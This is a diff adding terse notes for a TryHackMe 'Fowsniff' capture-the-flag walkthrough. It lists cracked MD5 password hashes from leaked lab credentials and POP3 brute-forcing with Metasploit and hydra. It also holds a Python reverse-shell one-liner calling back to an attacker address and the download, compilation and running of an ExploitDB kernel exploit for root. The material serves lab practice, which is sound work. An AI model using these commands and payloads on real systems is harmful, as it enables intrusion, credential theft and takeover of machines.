@@ -143,6 +143,81 @@ cat flag.txt
 
 # Fowsniff CTF
 tryhackme Fowsniff CTF walkthrough
-10.10.17.108
-nmap -Pn -A 10.10.17.108
-gobuster dir -u http://10.10.17.108 -w /usr/share/dirb/wordlists/common.txt
+10.10.94.201
+nmap -Pn -A 10.10.94.201
+gobuster dir -u http://10.10.94.201 -w /usr/share/dirb/wordlists/common.txt
+
+googled “fowsniff corp” and found a Pastebin link that contained username and passwords.
+https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
+https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
+
+https://crackstation.net/
+8a28a94a588a95b80163709ab4313aa4	md5	mailcall
+ae1644dac5b77c0cf51e0d26ad6d7e56	md5	bilbo101
+1dc352435fecca338acfd4be10984009	md5	apples01
+19f5af754c31f1e2651edde9250d69bb	md5	skyler22
+90dc16d47114aa13671c697fd506cf26	md5	scoobydoo2
+a92b8a29ef1183192e3d35187e0cfabd	Unknown	Not found.
+0e9588cb62f4b6f27e33d449e2ba0b3b	md5	carp4ever
+4d6e42f56e127803285a0a7649b5ab11	md5	orlando12
+f7fd98d380735e859f8b2ffbbede5a7e	md5	07011972
+
+msfconsole
+search pop3
+Use 0
+show options
+set rhosts 10.10.94.201
+set user_file userfow.txt
+set pass_file passfow.txt
+set verbose false
+run
+
+hydra -L userfow.txt -P passfow.txt pop3://10.10.94.201
+hydra pop3://10.10.94.201 -L userfow.txt -P passfow.txt
+
+nc 10.10.94.201 110
+USER seina
+PASS scoobydoo2
+LIST
+Command Used: RETR 1
+SSH Temporary Password: S1ck3nBluff+secureshell
+ssh baksteen@10.10.94.201
+uname –a
+id
+find / -group users -type f 2>/dev/null
+cd /opt/cube
+cat cube.sh
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+nc -lvp 1234
+id
+cd /root
+cat flag.txt
+
+find 116-generic on ExploitDB
+
+cd /var/www/html/
+
+wget https://www.exploit-db.com/download/44298
+
+mv 44298 44298.c
+
+gcc 44298.c -o exploit
+
+/etc/init.d/apache2 start
+
+ifconfig tun0
+
+cd /tmp/
+
+wget testerpc.test/exploit
+
+chmod +x exploit
+
+./exploit
+id
+cd /root && ls
+cat flag.txt
